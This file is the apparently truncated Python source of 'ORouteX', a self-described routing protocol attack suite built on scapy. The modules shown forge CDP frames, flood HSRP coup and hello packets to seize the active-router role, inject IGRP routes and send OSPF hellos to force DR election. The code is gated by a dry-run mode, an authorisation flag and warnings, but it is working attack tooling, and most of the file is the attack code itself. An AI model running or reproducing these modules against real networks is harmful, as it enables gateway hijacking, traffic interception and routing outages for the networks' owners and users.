#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                                                                              ║
# ║   ██████╗ ██████╗  ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗              ║
# ║  ██╔═══██╗██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝              ║
# ║  ██║   ██║██████╔╝██║   ██║██║   ██║   ██║   █████╗   ╚███╔╝               ║
# ║  ██║   ██║██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝   ██╔██╗               ║
# ║  ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██╔╝ ██╗              ║
# ║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝              ║
# ║                                                                              ║
# ║   Tool       : ORouteX — Routing Protocol Attack Suite                      ║
# ║   Category   : ONetwork / Protocol Security                                 ║
# ║   Version    : v1.0                                                         ║
# ║   Developer  : khaled.s.haddad                                              ║
# ║   Website    : owlsec.org                                                   ║
# ║   Year       : 2026                                                         ║
# ║   Platform   : Debian Linux / Root required                                 ║
# ║                                                                              ║
# ║   Modules:                                                                   ║
# ║     [1] CDP Spoof          — Fake Cisco Discovery Protocol frames           ║
# ║     [2] HSRP Hijack        — Seize Active Router via priority storm         ║
# ║     [3] IGRP Injection     — Poison legacy routing tables                   ║
# ║     [4] OSPF Injection     — Inject fake LSAs into OSPF domain              ║
# ║     [5] RIP Poisoning      — Inject poison routes via RIPv2                 ║
# ║     [6] ARP Spoof          — Classic ARP cache poisoning / MITM             ║
# ║     [7] Netmass Scanner    — ICMP discovery + threaded TCP port scan        ║
# ║     [8] Session Logger     — Record & replay scan sessions                  ║
# ║     [H] Help               — Detailed module documentation                  ║
# ║     [0] Exit                                                                 ║
# ║                                                                              ║
# ║   Requires   : pip install scapy netifaces                                  ║
# ║   Run As     : sudo python3 ORouteX.py                                      ║
# ║                                                                              ║
# ║   ⚠  AUTHORISED SECURITY TESTING USE ONLY                                  ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

import os
import sys
import time
import socket
import struct
import signal
import threading
import ipaddress
import json
import csv
import re
import random
import hashlib
import argparse
from datetime import datetime
from pathlib import Path
from collections import defaultdict

# ─── ROOT CHECK ───────────────────────────────────────────────────────────────
# Allow --help / --version and SAFE (dry-run) inspection without root. Live
# packet injection and raw-socket recon still need root; those paths warn below.
_WANT_INFO = any(a in ("--help", "-h", "--version") for a in sys.argv[1:])
if os.geteuid() != 0 and not _WANT_INFO:
    print("\n  [!] ORouteX normally needs root for raw sockets / live traffic.")
    print("      Running unprivileged: SAFE dry-run and --help only;")
    print("      recon and live transmission will be unavailable.")
    print("      For full use:  sudo ORouteX\n")

# ─── SCAPY IMPORT ─────────────────────────────────────────────────────────────
try:
    from scapy.all import (
        sendp as _raw_sendp, send as _raw_send, sr1, srp, get_if_hwaddr, get_if_addr,
        Raw, conf as scapy_conf, AsyncSniffer
    )
    from scapy.layers.inet import IP, UDP, TCP, ICMP
    from scapy.layers.l2 import Ether, ARP
    from scapy.packet import Packet, bind_layers
    from scapy.fields import (ByteField, ShortField, StrFixedLenField,
                               IPField, XShortField, IntField)
    try:
        from scapy.contrib.cdp import (CDP, CDPDeviceID, CDPPlatform,
                                        CDPAddr, CDPPortID,
                                        CDPSoftwareVersion)
        CDP_AVAILABLE = True
    except ImportError:
        CDP_AVAILABLE = False
    SCAPY_OK = True
except ImportError:
    print("\n  [!!!] scapy not found.\n"
          "        Install: pip install scapy\n")
    sys.exit(1)

try:
    import netifaces
    NETIFACES_OK = True
except ImportError:
    NETIFACES_OK = False

scapy_conf.verb = 0

# ═══════════════════════════════════════════════════════════════════════════════
#  SAFE-MODE TRANSMISSION GUARD  (defensive hardening)
# ───────────────────────────────────────────────────────────────────────────────
#  ORouteX ships in SAFE (dry-run) mode by default. Every offensive packet is
#  BUILT and SUMMARISED but NOT put on the wire, so the suite can be studied and
#  demonstrated without launching a live attack. Live transmission requires BOTH
#  the --i-am-authorized CLI flag AND a typed interactive confirmation, and is
#  intended strictly for an isolated lab you own or are explicitly authorized to
#  test. This makes the tool safe to run, inspect, and teach with by default.
# ═══════════════════════════════════════════════════════════════════════════════
SAFE_MODE = True            # live transmission disabled until explicitly unlocked
_SUPPRESSED_TX = 0          # counter of suppressed packets this run

def _pkt_summary(packet):
    try:
        return packet.summary()
    except Exception:
        return packet.__class__.__name__

def _safe_warn(packet, count=1):
    global _SUPPRESSED_TX
    _SUPPRESSED_TX += count
    try:
        print(f"  \033[38;5;208m[SAFE-MODE]\033[0m suppressed TX "
              f"(x{count}): {_pkt_summary(packet)}")
    except Exception:
        pass

def sendp(packet, *args, **kwargs):
    """Layer-2 send, gated by SAFE_MODE."""
    if SAFE_MODE:
        cnt = int(kwargs.get("count", 1) or 1)
        _safe_warn(packet, cnt)
        return None
    return _raw_sendp(packet, *args, **kwargs)

def send(packet, *args, **kwargs):
    """Layer-3 send, gated by SAFE_MODE."""
    if SAFE_MODE:
        cnt = int(kwargs.get("count", 1) or 1)
        _safe_warn(packet, cnt)
        return None
    return _raw_send(packet, *args, **kwargs)

def unlock_live_transmission(authorized_flag: bool) -> bool:
    """Attempt to leave SAFE_MODE. Requires the --i-am-authorized flag AND an
    interactive typed confirmation. Returns True if live TX is now enabled."""
    global SAFE_MODE
    if not SAFE_MODE:
        return True
    print()
    print("  \033[91m\033[1m*** LIVE ATTACK TRANSMISSION IS DISABLED (SAFE MODE) ***\033[0m")
    if not authorized_flag:
        print("  \033[2mRe-run with  --i-am-authorized  to enable live transmission on a")
        print("  network you own or are explicitly authorized to test.\033[0m")
        return False
    print("  \033[38;5;208mYou passed --i-am-authorized. Live packet injection can disrupt")
    print("  production networks and is illegal without written authorization.\033[0m")
    try:
        ans = input("  Type exactly  I HAVE AUTHORIZATION  to proceed: ").strip()
    except (EOFError, KeyboardInterrupt):
        ans = ""
    if ans == "I HAVE AUTHORIZATION":
        SAFE_MODE = False
        print("  \033[91mLive transmission ENABLED for this session.\033[0m")
        return True
    print("  \033[92mStaying in SAFE (dry-run) mode. No packets will be transmitted.\033[0m")
    return False

# ═══════════════════════════════════════════════════════════════════════════════
#  COLOUR PALETTE  (ANSI 256 + standard)
# ═══════════════════════════════════════════════════════════════════════════════
R   = "\033[0m"
CY  = "\033[96m"           # cyan       — banners / info
MG  = "\033[95m"           # magenta    — tool name / highlights
GR  = "\033[92m"           # green      — success / found
RD  = "\033[91m"           # red        — error / critical
YL  = "\033[93m"           # yellow     — headers / prompts
OR  = "\033[38;5;208m"     # orange     — warnings
DM  = "\033[2m"            # dim        — secondary text
BD  = "\033[1m"            # bold
BL  = "\033[94m"           # blue       — module numbers
UL  = "\033[4m"            # underline
PK  = "\033[38;5;205m"     # pink       — special events
WH  = "\033[97m"           # bright white

# ─── SEPARATORS ───────────────────────────────────────────────────────────────
W   = 68
SEP     = f"{CY}{'═' * W}{R}"
SEP_DIM = f"{DM}{'─' * W}{R}"
SEP_YL  = f"{YL}{'─' * W}{R}"

# ─── METADATA ─────────────────────────────────────────────────────────────────
APP     = "ORouteX"
FULL    = "Routing Protocol Attack Suite"
VERSION = "v1.0"
DEV     = "khaled.s.haddad"
SITE    = "owlsec.org"
YEAR    = "2026"
CAT     = "ONetwork / Protocol Security"

# ─── SESSION LOG ──────────────────────────────────────────────────────────────
_session_log: list  = []
_session_lock       = threading.Lock()
_stop_flags: dict   = {}      # module_name -> threading.Event

# ─── SCAN RESULTS GLOBAL ──────────────────────────────────────────────────────
_scan_results: list = []
_scan_lock          = threading.Lock()
DEFAULT_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
    443, 445, 993, 1433, 1521, 3306, 3389,
    5432, 5900, 6379, 8080, 8443, 8888, 27017,
]


# ═══════════════════════════════════════════════════════════════════════════════
#  CUSTOM PACKET DEFINITIONS
# ═══════════════════════════════════════════════════════════════════════════════

class _HSRP(Packet):
    """HSRP v1 Hello / Coup / Resign."""
    name = "HSRP"
    fields_desc = [
        ByteField("version",    0),
        ByteField("opcode",     0),      # 0=Hello 1=Coup 2=Resign
        ByteField("state",     16),      # 16=Active
        ByteField("hellotime",  3),
        ByteField("holdtime",  10),
        ByteField("priority", 255),      # max wins
        ByteField("group",      1),
        ByteField("reserved",   0),
        StrFixedLenField("password", b"cisco\x00\x00\x00", 8),
        IPField("virtual_ip", "0.0.0.0"),
    ]

bind_layers(UDP, _HSRP, dport=1985)


class _IGRP(Packet):
    """Simplified IGRP header (IP proto 9)."""
    name = "IGRP"
    fields_desc = [
        ByteField("version",        1),
        ByteField("opcode",         1),  # 1=Update
        ByteField("edition",        0),
        ByteField("as_number_high", 0),
        ShortField("as_number_low", 100),
        ShortField("interior",      0),
        ShortField("system",        0),
        ShortField("exterior",      0),
        XShortField("checksum",     0),
    ]


class _OSPFHello(Packet):
    """Minimal OSPF Hello (type 1) — enough to trigger neighbour adjacency."""
    name = "OSPF Hello"
    fields_desc = [
        ByteField("version",       2),
        ByteField("type",          1),     # 1=Hello
        ShortField("length",      44),
        IPField("router_id",  "1.2.3.4"),
        IPField("area_id",    "0.0.0.0"),
        XShortField("checksum",    0),
        ShortField("auth_type",    0),
        IntField("auth_data",      0),
        IntField("auth_data2",     0),
        IPField("netmask",   "255.255.255.0"),
        ShortField("hello_interval",  10),
        ByteField("options",       2),
        ByteField("priority",    255),
        IntField("dead_interval",  40),
        IPField("designated",  "0.0.0.0"),
        IPField("backup",      "0.0.0.0"),
    ]


class _RIPv2Entry(Packet):
    """Single RIPv2 route entry."""
    name = "RIPv2 Entry"
    fields_desc = [
        ShortField("afi",       2),
        ShortField("route_tag", 0),
        IPField("prefix",   "10.0.0.0"),
        IPField("mask",     "255.255.255.0"),
        IPField("nexthop",  "0.0.0.0"),
        IntField("metric",      16),     # 16=infinity (poison)
    ]


# ═══════════════════════════════════════════════════════════════════════════════
#  UI / OUTPUT HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def _ts_now():
    return datetime.now().strftime("%H:%M:%S")

def _ts_file():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def _log(kind: str, msg: str, colour: str = ""):
    entry = {"ts": _ts_now(), "kind": kind, "msg": msg}
    with _session_lock:
        _session_log.append(entry)

def ok(msg: str):
    _log("OK", msg)
    print(f"  {GR}[✔]{R} {msg}")

def err(msg: str):
    _log("ERR", msg)
    print(f"  {RD}[✘]{R} {msg}")

def warn(msg: str):
    _log("WARN", msg)
    print(f"  {OR}[!]{R} {msg}")

def info(msg: str):
    _log("INFO", msg)
    print(f"  {CY}[*]{R} {msg}")

def dbg(msg: str):
    print(f"  {DM}[~]{R} {DM}{msg}{R}")

def step(n: int, msg: str):
    print(f"  {BL}[{n}]{R} {msg}")

def bullet(msg: str):
    print(f"  {YL}+--{R} {msg}")

def blank():
    print()


def banner():
    os.system("clear")
    w = W
    art = (
        f"\n{CY}"
        r"   ___  ____              __       _  __" "\n"
        r"  / _ \/ __ \ ___  __ __/ /____  | |/ /" "\n"
        r" / // / /_/ // _ \/ // / __/ -_) |   / " "\n"
        r"/____/\____//_//_/\_,_/\__/\___/ |_|\_\ " "\n"
        f"{R}"
    )
    print(art)
    print(f"  {MG}{BD}{APP}{R}  —  {WH}{FULL}{R}  {DM}{VERSION}{R}")
    print(f"  {DM}{DEV}  ·  {SITE}  ·  {YEAR}  ·  {CAT}{R}")
    print()
    print(SEP)


def section(title: str, colour: str = YL):
    blank()
    print(f"  {colour}{BD}╔══  {title}{R}")
    print(f"  {colour}{'─' * (W - 2)}{R}")


def sub_section(title: str):
    print(f"\n  {CY}+-- {title}{R}")
    print(f"  {DM}{'·' * 50}{R}")


def pause():
    input(f"\n  {DM}[ Press ENTER to return to menu ]{R}")


def _confirm(msg: str) -> bool:
    r = input(f"\n  {OR}[?]{R} {msg} {YL}[y/N]{R}  ").strip().lower()
    return r in ("y", "yes")


def prompt(msg: str, default: str = "") -> str:
    suffix = f" {DM}[{default}]{R}" if default else ""
    raw = input(f"\n  {YL}[>>]{R} {msg}{suffix}  ").strip()
    return raw if raw else default


def prompt_int(msg: str, default: int,
               lo: int = 1, hi: int = 65535) -> int:
    while True:
        raw = prompt(msg, str(default))
        try:
            v = int(raw)
            if lo <= v <= hi:
                return v
            warn(f"Enter a value between {lo} and {hi}.")
        except ValueError:
            err("Not a valid integer.")


def prompt_ip(msg: str, default: str = "") -> str:
    while True:
        raw = prompt(msg, default)
        try:
            socket.inet_aton(raw)
            return raw
        except OSError:
            err(f"'{raw}' is not a valid IPv4 address.")


# ═══════════════════════════════════════════════════════════════════════════════
#  INTERFACE HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def list_interfaces() -> list:
    ifaces = []
    if NETIFACES_OK:
        ifaces = netifaces.interfaces()
    else:
        try:
            with open("/proc/net/dev") as f:
                for line in f.readlines()[2:]:
                    if ":" in line:
                        ifaces.append(line.split(":")[0].strip())
        except Exception:
            ifaces = ["eth0", "wlan0"]
    return [i for i in ifaces if i != "lo"] or ifaces


def get_iface_details(iface: str) -> dict:
    """Return {'mac': ..., 'ip': ..., 'mask': ...}."""
    details = {"mac": "00:11:22:33:44:55",
               "ip":  "0.0.0.0",
               "mask":"255.255.255.0"}
    try:
        details["mac"] = get_if_hwaddr(iface)
    except Exception:
        pass
    try:
        details["ip"] = get_if_addr(iface)
    except Exception:
        pass
    if NETIFACES_OK:
        try:
            af = netifaces.AF_INET
            addrs = netifaces.ifaddresses(iface).get(af, [{}])
            details["mask"] = addrs[0].get("netmask", "255.255.255.0")
        except Exception:
            pass
    return details


def pick_interface(show_details: bool = True) -> str:
    ifaces = list_interfaces()
    section("SELECT NETWORK INTERFACE")
    print()
    for i, iface in enumerate(ifaces, 1):
        if show_details:
            d = get_iface_details(iface)
            print(f"    {BL}[{i}]{R}  {BD}{iface:<12}{R}  "
                  f"ip={CY}{d['ip']}{R}  mac={DM}{d['mac']}{R}")
        else:
            print(f"    {BL}[{i}]{R}  {iface}")
    blank()
    raw = prompt("Interface number  or  type name directly")
    if raw.isdigit():
        idx = int(raw) - 1
        if 0 <= idx < len(ifaces):
            chosen = ifaces[idx]
            ok(f"Selected interface: {BD}{chosen}{R}")
            return chosen
    if raw in ifaces:
        ok(f"Selected interface: {BD}{raw}{R}")
        return raw
    warn(f"'{raw}' not in detected list — using as-is.")
    return raw


# ═══════════════════════════════════════════════════════════════════════════════
#  SAVE RESULTS HELPER
# ═══════════════════════════════════════════════════════════════════════════════

SAVE_MODES = {
    "1": "Current Directory",
    "2": "Home Folder  (~)",
    "3": "Custom Path…",
    "4": "Skip saving",
}

def ask_save_path(prefix: str) -> str | None:
    """Ask user where to save output files. Returns directory or None."""
    section("SAVE RESULTS")
    for k, v in SAVE_MODES.items():
        print(f"    {BL}[{k}]{R}  {v}")
    choice = prompt("Save location", "1")
    if choice == "1":
        return str(Path.cwd())
    elif choice == "2":
        d = Path.home() / "ORouteX_results"
        d.mkdir(parents=True, exist_ok=True)
        return str(d)
    elif choice == "3":
        raw = prompt("Enter full directory path", str(Path.home()))
        try:
            Path(raw).mkdir(parents=True, exist_ok=True)
            return raw
        except Exception as e:
            err(f"Cannot create directory: {e}")
            return str(Path.cwd())
    else:
        info("Results will not be saved to disk.")
        return None


def save_results(data: dict, prefix: str, out_dir: str,
                 formats: list = None) -> list:
    """
    Save data in one or more formats.
    formats: list of 'json', 'csv', 'txt', 'html', 'md'
    Returns list of saved file paths.
    """
    if formats is None:
        formats = ["json", "txt"]
    ts    = _ts_file()
    base  = os.path.join(out_dir, f"{prefix}_{ts}")
    saved = []

    if "json" in formats:
        p = f"{base}.json"
        try:
            with open(p, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            saved.append(p)
        except Exception as e:
            err(f"JSON save failed: {e}")

    if "csv" in formats and "results" in data:
        p = f"{base}.csv"
        try:
            rows = data["results"]
            if rows:
                with open(p, "w", newline="", encoding="utf-8") as f:
                    w = csv.DictWriter(f, fieldnames=rows[0].keys())
                    w.writeheader(); w.writerows(rows)
                saved.append(p)
        except Exception as e:
            err(f"CSV save failed: {e}")

    if "txt" in formats:
        p = f"{base}.txt"
        try:
            with open(p, "w", encoding="utf-8") as f:
                f.write(_render_txt_report(data))
            saved.append(p)
        except Exception as e:
            err(f"TXT save failed: {e}")

    if "html" in formats:
        p = f"{base}.html"
        try:
            with open(p, "w", encoding="utf-8") as f:
                f.write(_render_html_report(data))
            saved.append(p)
        except Exception as e:
            err(f"HTML save failed: {e}")

    if "md" in formats:
        p = f"{base}.md"
        try:
            with open(p, "w", encoding="utf-8") as f:
                f.write(_render_md_report(data))
            saved.append(p)
        except Exception as e:
            err(f"Markdown save failed: {e}")

    return saved


def _render_txt_report(data: dict) -> str:
    lines = [
        f"{'═' * 70}",
        f"  {APP} {VERSION}  ·  {DEV}  ·  {SITE}",
        f"  Module   : {data.get('module','—')}",
        f"  Target   : {data.get('target','—')}",
        f"  Date     : {datetime.now().isoformat()[:19]}",
        f"{'═' * 70}", "",
    ]
    for r in data.get("results", []):
        lines.append("  " + "  ".join(f"{k}={v}" for k, v in r.items()))
    lines += ["", f"  Total: {len(data.get('results',[]))} record(s)",
              f"{'─' * 70}"]
    return "\n".join(lines)


def _render_html_report(data: dict) -> str:
    rows = data.get("results", [])
    thead = ""
    tbody = ""
    if rows:
        thead = "<tr>" + "".join(
            f"<th>{k}</th>" for k in rows[0].keys()) + "</tr>"
        tbody = "\n".join(
            "<tr>" + "".join(f"<td>{v}</td>" for v in r.values()) + "</tr>"
            for r in rows)
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>{APP} — {data.get('module','')}</title>
<style>
body{{background:#0d1117;color:#e6edf3;font-family:Consolas,monospace;padding:24px}}
h1{{color:#39c5cf}} h2{{color:#e3b341}}
table{{width:100%;border-collapse:collapse;font-size:.9rem}}
th{{background:#161b22;color:#e3b341;padding:8px;text-align:left;border-bottom:2px solid #30363d}}
td{{padding:6px 10px;border-bottom:1px solid #21262d}}
tr:hover td{{background:#161b22}}
.meta{{color:#8b949e;margin:8px 0}}
</style></head><body>
<h1>🦉 {APP} {VERSION}</h1>
<div class="meta">{DEV} · {SITE} · {YEAR} · ⚠ Authorised testing only</div>
<h2>Module: {data.get('module','—')}</h2>
<div class="meta">Target: {data.get('target','—')} &nbsp;|&nbsp;
Date: {datetime.now().isoformat()[:19]}</div>
<table><thead>{thead}</thead><tbody>{tbody}</tbody></table>
<div class="meta">Total: {len(rows)} record(s)</div>
</body></html>"""


def _render_md_report(data: dict) -> str:
    rows = data.get("results", [])
    lines = [
        f"# 🦉 {APP} {VERSION} — {data.get('module','Report')}",
        "",
        f"> **Target:** `{data.get('target','—')}` &nbsp; "
        f"**Date:** {datetime.now().isoformat()[:19]}  ",
        f"> ⚠ *Authorised security testing use only*",
        "",
    ]
    if rows:
        keys = list(rows[0].keys())
        lines.append("| " + " | ".join(keys) + " |")
        lines.append("| " + " | ".join("---" for _ in keys) + " |")
        for r in rows:
            lines.append("| " + " | ".join(
                f"`{r[k]}`" for k in keys) + " |")
    else:
        lines.append("*No results.*")
    lines += ["", f"**Total:** {len(rows)} record(s)",
              f"*Generated by {APP} {VERSION} · {SITE}*"]
    return "\n".join(lines)


def _ask_export_formats() -> list:
    """Let user pick which file formats to export."""
    sub_section("EXPORT FORMATS")
    fmt_map = {
        "1": "json",
        "2": "csv",
        "3": "txt",
        "4": "html",
        "5": "md",
    }
    for k, v in fmt_map.items():
        print(f"    {BL}[{k}]{R}  {v.upper()}")
    print(f"    {BL}[A]{R}  All formats")
    raw = prompt("Select format(s) — comma-separated or A", "1,3").upper()
    if "A" in raw:
        return list(fmt_map.values())
    chosen = []
    for part in raw.split(","):
        part = part.strip()
        if part in fmt_map:
            chosen.append(fmt_map[part])
    return chosen or ["json", "txt"]


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 1 — CDP SPOOF
# ═══════════════════════════════════════════════════════════════════════════════

def module_cdp():
    banner()
    section("MODULE 1 — CDP SPOOF", CY)
    info("Sends forged Cisco Discovery Protocol frames to the LAN segment,")
    info("impersonating a Cisco router/switch device.")
    blank()

    if not CDP_AVAILABLE:
        err("scapy CDP contrib not available.")
        err("Try: pip install scapy  (full install, not --pre minimal)")
        pause(); return

    iface       = pick_interface()
    details     = get_iface_details(iface)
    target_ip   = prompt_ip("Target IP (CDPAddr field)", details["ip"])
    fake_device = prompt("Fake device hostname", "OWLSEC-ROUTER-01")
    fake_plat   = prompt("Fake platform string", "Cisco Catalyst 3750")
    fake_port   = prompt("Fake interface name",  "GigabitEthernet0/1")
    fake_ios    = prompt("Fake IOS version",
                         "Cisco IOS Software, Version 15.2(4)S7")
    interval    = prompt_int("Send interval (seconds)", 1, 1, 60)
    count_s     = prompt("Packet count (0 = infinite)", "0")
    limit       = int(count_s) if count_s.isdigit() else 0

    blank(); section("CDP SPOOF — RUNNING", GR)
    info(f"Interface   : {BD}{iface}{R}")
    info(f"Src MAC     : {details['mac']}")
    info(f"Target IP   : {target_ip}")
    info(f"Device ID   : {fake_device}")
    info(f"Platform    : {fake_plat}")
    info(f"Interval    : {interval}s")
    info(f"Limit       : {'∞' if limit == 0 else limit} packets")
    warn("Press Ctrl-C to stop.")
    blank()

    ether     = Ether(dst="01:00:0c:cc:cc:cc",
                      src=details["mac"])
    cdp_hdr   = CDP(version=2, ttl=180, checksum=0)
    device_id = CDPDeviceID(val=fake_device)
    platform  = CDPPlatform(val=fake_plat)
    addresses = CDPAddr(addr=target_ip)
    port_id   = CDPPortID(val=fake_port)
    software  = CDPSoftwareVersion(val=fake_ios)
    packet    = (ether / cdp_hdr / device_id / platform /
                 addresses / port_id / software)

    sent = 0
    try:
        while True:
            sendp(packet, iface=iface, verbose=False)
            sent += 1
            ts = _ts_now()
            print(f"\r  {GR}[✔]{R} [{ts}]  CDP sent: "
                  f"{BD}{sent}{R}{'/' + str(limit) if limit else ''}  "
                  f"→ {fake_device}  ({target_ip})    ",
                  end="", flush=True)
            _log("SENT", f"CDP frame #{sent} → {fake_device}")
            if limit and sent >= limit:
                break
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

    print()
    ok(f"CDP flood stopped.  Total packets sent: {BD}{sent}{R}")

    out_dir = ask_save_path("cdp_spoof")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module": "CDP Spoof", "target": target_ip,
            "iface": iface, "device": fake_device,
            "packets_sent": sent,
            "results": [{"packet": i+1, "device": fake_device,
                          "target_ip": target_ip}
                         for i in range(sent)],
        }, "cdp_spoof", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 2 — HSRP HIJACK
# ═══════════════════════════════════════════════════════════════════════════════

def module_hsrp():
    banner()
    section("MODULE 2 — HSRP HIJACK", CY)
    info("Floods 224.0.0.2:1985 with maximum-priority HSRP Hello packets")
    info("to seize the Active Router role and redirect default gateway traffic.")
    blank()

    iface      = pick_interface()
    details    = get_iface_details(iface)
    virtual_ip = prompt_ip("HSRP Virtual IP", "192.168.1.1")
    group      = prompt_int("HSRP Group number", 1, 0, 255)
    password   = prompt("HSRP Authentication password", "cisco")
    priority   = prompt_int("Priority to claim (max=255)", 255, 1, 255)
    burst      = prompt_int("Burst packet count", 100, 1, 10000)
    interval_ms= prompt_int("Interval between packets (ms)", 100, 10, 5000)

    blank(); section("HSRP HIJACK — RUNNING", GR)
    info(f"Interface  : {BD}{iface}{R}  ({details['ip']})")
    info(f"Virtual IP : {virtual_ip}")
    info(f"Group      : {group}")
    info(f"Priority   : {priority}  (claiming Active role)")
    info(f"Password   : {password}")
    info(f"Burst      : {burst} packets @ {interval_ms}ms")
    warn("Press Ctrl-C to abort.")
    blank()

    pwd_bytes = password.encode()[:8].ljust(8, b"\x00")
    ip_pkt    = IP(src=details["ip"], dst="224.0.0.2")
    udp_pkt   = UDP(sport=1985, dport=1985)

    # Send Hello first to announce presence
    hello  = _HSRP(opcode=0, state=16, priority=priority,
                   group=group, password=pwd_bytes,
                   virtual_ip=virtual_ip)
    # Then Coup to aggressively claim role
    coup   = _HSRP(opcode=1, state=16, priority=priority,
                   group=group, password=pwd_bytes,
                   virtual_ip=virtual_ip)

    pkt_hello = ip_pkt / udp_pkt / hello
    pkt_coup  = ip_pkt / udp_pkt / coup

    sent = 0
    try:
        for i in range(1, burst + 1):
            # Alternate Hello / Coup for maximum effect
            pkt = pkt_coup if i % 5 == 0 else pkt_hello
            send(pkt, iface=iface, verbose=False)
            sent += 1
            kind = "COUP" if i % 5 == 0 else "HELLO"
            print(f"\r  {GR}[✔]{R} [{_ts_now()}]  "
                  f"{kind:<5}  Sent: {BD}{sent}{R}/{burst}  "
                  f"priority={priority}  grp={group}   ",
                  end="", flush=True)
            time.sleep(interval_ms / 1000)
    except KeyboardInterrupt:
        pass

    print()
    ok(f"HSRP burst complete.  {BD}{sent}{R} packets sent.")
    ok(f"This host ({details['ip']}) should now be "
       f"Active router for group {group}.")
    warn("Verify with: 'ip route show' or Wireshark filter: hsrp")

    out_dir = ask_save_path("hsrp_hijack")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module": "HSRP Hijack",
            "target": virtual_ip,
            "iface":  iface,
            "group":  group,
            "priority": priority,
            "packets_sent": sent,
            "results": [{"group": group, "virtual_ip": virtual_ip,
                         "priority": priority,
                         "attacker_ip": details["ip"],
                         "packets": sent}],
        }, "hsrp_hijack", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 3 — IGRP ROUTE INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

def module_igrp():
    banner()
    section("MODULE 3 — IGRP ROUTE INJECTION", CY)
    info("Crafts raw IGRP Update packets (IP proto 9) to pollute")
    info("routing tables of legacy Cisco routers still running IGRP.")
    blank()

    iface      = pick_interface()
    details    = get_iface_details(iface)
    target_net = prompt_ip("Target network to inject", "10.0.0.0")
    netmask    = prompt("Subnet mask", "255.255.255.0")
    metric     = prompt_int("Route metric", 1, 1, 16777215)
    as_number  = prompt_int("AS number", 100, 1, 65535)
    burst      = prompt_int("Injection packet count", 50, 1, 10000)
    delay_ms   = prompt_int("Delay between packets (ms)", 500, 10, 5000)

    blank(); section("IGRP INJECTION — RUNNING", GR)
    info(f"Interface      : {BD}{iface}{R}  ({details['ip']})")
    info(f"Target network : {target_net}")
    info(f"Netmask        : {netmask}")
    info(f"Metric         : {metric}")
    info(f"AS number      : {as_number}")
    info(f"Burst          : {burst} packets @ {delay_ms}ms")
    warn("Press Ctrl-C to abort.")
    blank()

    try:
        net_bytes  = socket.inet_aton(target_net)
        mask_bytes = socket.inet_aton(netmask)
    except OSError as e:
        err(f"Invalid address: {e}"); pause(); return

    payload  = net_bytes + mask_bytes + struct.pack("!H", metric)
    igrp_pkt = _IGRP(as_number_low=as_number)
    ip_pkt   = IP(src=details["ip"], dst="224.0.0.9", proto=9)
    packet   = ip_pkt / igrp_pkt / Raw(load=payload)

    sent = 0
    try:
        for i in range(1, burst + 1):
            send(packet, iface=iface, verbose=False)
            sent += 1
            print(f"\r  {GR}[✔]{R} [{_ts_now()}]  "
                  f"IGRP Update: {BD}{sent}{R}/{burst}  "
                  f"→ {target_net}  metric={metric}  AS={as_number}   ",
                  end="", flush=True)
            time.sleep(delay_ms / 1000)
    except KeyboardInterrupt:
        pass

    print()
    ok(f"IGRP injection complete.  {BD}{sent}{R} packets sent.")
    ok(f"Route {target_net}/{netmask} → {details['ip']} (if accepted).")
    warn("Legacy IGRP acceptance depends on router config and AS match.")

    out_dir = ask_save_path("igrp_inject")
    if out_dir:
        fmts  = _ask_export_formats()
        paths = save_results({
            "module":      "IGRP Route Injection",
            "target":      target_net,
            "as_number":   as_number,
            "packets_sent": sent,
            "results": [{"network": target_net, "mask": netmask,
                         "metric": metric, "as": as_number,
                         "attacker": details["ip"],
                         "packets": sent}],
        }, "igrp_inject", out_dir, fmts)
        for p in paths:
            ok(f"Saved → {BD}{p}{R}")

    pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  MODULE 4 — OSPF INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

def module_ospf():
    banner()
    section("MODULE 4 — OSPF INJECTION", CY)
    info("Sends forged OSPF Hello packets to trigger neighbour adjacency")
    info("and inject fake LSAs into the OSPF domain (IP proto 89).")
    blank()

    iface     = pick_interface()
    details   = get_iface_details(iface)
    router_id = prompt_ip("Fake Router-ID to advertise", "10.99.99.1")
    area_id   = prompt_ip("OSPF Area ID", "0.0.0.0")
    priority  = prompt_int("DR Priority (255=force DR election)", 255, 0, 255)
    burst     = prompt_int("Hello packet count", 60, 1, 10000)
    interval  = prompt_int("Hello interval (sec)", 10, 1, 60)

    blank(); section("OSPF INJECTION — RUNNING", GR)
    info(f"Interface  : {BD}{iface}{R}  ({details['ip']})")
    info(f"Router-ID  : {router_id}")
    info(f"Area       : {area_id}")
    info(f"DR Prio    : {priority}")
    info(f"Burst      : {burst} hellos @ {interval}s")
    warn("Press Ctrl-C to abort.")
    blank()

    ospf = _OSPFHello(
        router_id=router_id,
        area_id=area_id,
        priority=priority,
        hello_interval=interval,
        dead_interval=interval * 4,
    )
    ip_pkt = IP(src=details["ip"], dst="224.0.0.5", proto=89)
    packet = ip_pkt / ospf

    sent = 0
    try:
        for i in range(burst):
            send(packet, iface=iface, verbose=False)
            sent += 1
            print(f"\r  {GR}[✔]{R} [{_ts_now()}]  "
                  f"OSPF Hello: {BD}{sent}{R}/{burst}  "
                  f"router-id={router_id}  area={area_id}   ",
                  end="", flush=True)
